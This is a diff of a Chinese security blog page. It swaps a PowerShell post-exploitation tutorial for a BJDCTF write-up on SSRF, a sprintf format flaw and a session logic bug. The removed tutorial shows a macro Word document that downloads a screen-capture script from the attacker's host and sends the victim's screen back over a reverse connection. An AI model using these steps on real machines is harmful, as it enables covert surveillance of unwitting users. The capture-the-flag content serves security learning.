@@ -8,12 +8,12 @@
   
   
   
-  <title>Powershell------对目标进行屏幕监控 | skyeの博客</title>
+  <title>BJDCTF-文件探测-ssrf+逻辑漏洞 | skyeの博客</title>
 
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
   
-    <meta name="keywords" content="后渗透-powershell脚本使用," />
+    <meta name="keywords" content="CTF," />
   
 
   <script>
@@ -240,24 +240,24 @@
 
 <div class="post">
   <h1 class="article-title">
-    <span>Powershell------对目标进行屏幕监控</span>
+    <span>BJDCTF-文件探测-ssrf+逻辑漏洞</span>
   </h1>
   <div class="article-top-meta">
     <span>
       发布 : 
-      2020-03-25
+      2020-03-26
     </span>
     
       <span>
         分类 : 
-          <a href="/categories/%E5%90%8E%E6%B8%97%E9%80%8F-powershell%E8%84%9A%E6%9C%AC%E4%BD%BF%E7%94%A8/">
-            后渗透-powershell脚本使用
+          <a href="/categories/CTF/">
+            CTF
           </a>
       </span>
     
     
       <span>
-        浏览 : <span class="article-timer" data-identity="Powershell------对目标进行屏幕监控"></span>
+        浏览 : <span class="article-timer" data-identity="BJDCTF-文件探测-ssrf+逻辑漏洞"></span>
       </span>
     
   </div>
@@ -266,21 +266,9 @@
 
   <div class="article-content">
     <div class="markdown-body">
-      <p>然后在自己的计算机上使用火狐访问目标3333端口，结果如下图：<br><img src="https://img-blog.csdnimg.cn/20200325191758673.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTg4MTY4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h2 id="Reverse模式"><a href="#Reverse模式" class="headerlink" title="Reverse模式"></a><strong>Reverse模式</strong></h2><p><strong>attacker：</strong></p>
-<p>在这里可以使用创宇的py脚本转发：</p>
-<p><a href="https://github.com/knownsec/rtcp">https://github.com/knownsec/rtcp</a><br><strong>执行:</strong></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rtcp [master] python rtcp.py l:<span class="number">5555</span> l:<span class="number">4444</span></span><br><span class="line">监听本地<span class="number">5555</span>端口以及<span class="number">4444</span>端口。</span><br></pre></td></tr></table></figure>
-
-<p>   之后在target执行：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\evi1cg\Desktop&gt; . .\Show-TargetScreen.ps1</span><br><span class="line">PS C:\Users\evi1cg\Desktop&gt; Show-TargetScreen -Reverse-IPAddress <span class="number">192.168</span><span class="number">.74</span><span class="number">.1</span> -Port <span class="number">5555</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20200325192032100.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTg4MTY4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h2 id="使用Powershell-Client"><a href="#使用Powershell-Client" class="headerlink" title="使用Powershell Client"></a>使用Powershell Client</h2><p>以Out-Word.ps1作为演示示例：</p>
-<p>生成word文件:</p>
-<p>PS C:\Users\evi1cg\Desktop&gt; . .\Out-Word.ps1<br>PS C:\Users\evi1cg\Desktop&gt; Out-Word -PayloadURL”<a href="http://192.168.74.1/Show-TargetScreen.ps1&quot;">http://192.168.74.1/Show-TargetScreen.ps1&quot;</a> -Arguments”Show-TargetScreen -Reverse -IPAddress 192.168.74.1 -Port 6666”<br>之后将Show-TargetScreen.ps1放在我们的web根目录：</p>
-<p>测试：<br><img src="https://img-blog.csdnimg.cn/20200325192125861.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTg4MTY4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>开启监听：</p>
-<p>rtcp [master] python rtcp.py l:6666 l:4444<br>当运行开启office宏的word时，我们就可对其屏幕进行监控，如下图：<br><img src="https://img-blog.csdnimg.cn/20200325192133185.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTg4MTY4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+      <p><strong>一、ssrf</strong><br>信息收集了一波，发现home.php这个hint以及admin.php，访问<br><img src="https://img-blog.csdnimg.cn/20200324161042584.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTg4MTY4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200324160321427.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTg4MTY4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br> 随后用伪协议读取system.php的源码和<br> <img src="https://img-blog.csdnimg.cn/20200324160418606.png" alt="在这里插入图片描述"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_COOKIE[<span class="string">'y1ng'</span>]) || $_COOKIE[<span class="string">'y1ng'</span>] !== sha1(md5(<span class="string">'y1ng'</span>)))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('why you are here!');alert('fxck your scanner');alert('fxck you! get out!');&lt;/script&gt;"</span>;</span><br><span class="line">    header(<span class="string">"Refresh:0.1;url=index.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$str2 = <span class="string">'&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;url invalid&lt;br&gt;~$ '</span>;</span><br><span class="line">$str3 = <span class="string">'&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;damn hacker!&lt;br&gt;~$ '</span>;</span><br><span class="line">$str4 = <span class="string">'&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;request method error&lt;br&gt;~$ '</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$filter1 = <span class="string">'/^http:\/\/127\.0\.0\.1\//i'</span>;</span><br><span class="line">$filter2 = <span class="string">'/.?f.?l.?a.?g.?/i'</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'q1'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'q2'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'q3'</span>]) ) &#123;</span><br><span class="line">    $url = $_POST[<span class="string">'q2'</span>].<span class="string">".y1ng.txt"</span>;</span><br><span class="line">    $method = $_POST[<span class="string">'q3'</span>];</span><br><span class="line"></span><br><span class="line">    $str1 = <span class="string">"~$ python fuck.py -u \""</span>.$url .<span class="string">"\" -M $method -U y1ng -P admin123123 --neglect-negative --debug --hint=xiangdemei&lt;br&gt;"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> $str1;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!preg_match($filter1, $url) )&#123;</span><br><span class="line">        <span class="keyword">die</span>($str2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (preg_match($filter2, $url)) &#123;</span><br><span class="line">        <span class="keyword">die</span>($str3);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/^GET/i'</span>, $method) &amp;&amp; !preg_match(<span class="string">'/^POST/i'</span>, $method)) &#123;</span><br><span class="line">        <span class="keyword">die</span>($str4);</span><br><span class="line">    &#125;</span><br><span class="line">    $detect = @file_get_contents($url, <span class="keyword">false</span>);</span><br><span class="line">    <span class="keyword">print</span>(sprintf(<span class="string">"$url method&amp;content_size:$method%d"</span>, $detect));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这里有两个点<br>1、q2参数会拼接.y1ng.txt，当时用的#绕过，发现师傅wp还可以用admin.php?a=<br>2、q3参数有个sprintf格式化漏洞采用%s%绕过，用了%s%后，会将要输出的内容用%s格式化输出在%s%的位置，而不是用%d格式化输出。<br>随后打到了admin.php的源码<br><img src="https://img-blog.csdnimg.cn/20200324161355348.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTg4MTY4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>二、逻辑洞</strong><br>下面的随机数mt_rand只是生成了长度，后面用的函数无法进行随机数爆破。<br>这里将phpsessid删除，访问就可以了。删除后访问，$data值将是空，这样就能计算aes加密的值了<br><img src="https://img-blog.csdnimg.cn/20200324161654623.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTg4MTY4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>带上加密的值，删除phpsessid访问。</p>
     </div>
   </div>
   
@@ -291,7 +279,7 @@
         
           本文作者 : skye <br/>
         
-        原文链接 : <a href="">http://forever-sky.github.io/2020/03/25/Powershell------%E5%AF%B9%E7%9B%AE%E6%A0%87%E8%BF%9B%E8%A1%8C%E5%B1%8F%E5%B9%95%E7%9B%91%E6%8E%A7/</a><br>
+        原文链接 : <a href="">http://forever-sky.github.io/2020/03/26/BJDCTF-%E6%96%87%E4%BB%B6%E6%8E%A2%E6%B5%8B-ssrf+%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/</a><br>
         版权声明 : 本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！
         </blockquote>
       </div>
@@ -374,13 +362,13 @@
       <div class="nav-pre">
         <i class="iconfont icon-prev"></i>
         上一篇:
-        <a href="/2020/03/25/metasploit------%E5%90%8E%E6%B8%97%E9%80%8F/" target="_self">metasploit------后渗透</a>
+        <a href="/2020/03/25/Powershell------%E5%AF%B9%E7%9B%AE%E6%A0%87%E8%BF%9B%E8%A1%8C%E5%B1%8F%E5%B9%95%E7%9B%91%E6%8E%A7/" target="_self">Powershell------对目标进行屏幕监控</a>
       </div>
     
     
       <div class="nav-next">
         下一篇:
-        <a href="/2020/03/26/BJDCTF-%E6%96%87%E4%BB%B6%E6%8E%A2%E6%B5%8B-ssrf+%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" target="_self">BJDCTF-文件探测-ssrf+逻辑漏洞</a>
+        <a href="/2020/03/26/i%E6%98%A5%E7%A7%8B%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B%20web%20blacklist%E5%88%A9%E7%94%A8mysql%E7%89%B9%E6%80%A7handler%E8%BF%9B%E8%A1%8C%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/" target="_self">i春秋网络安全公益赛 web blacklist利用mysql特性handler进行堆叠注入</a>
         <i class="iconfont icon-next"></i>
       </div>
     
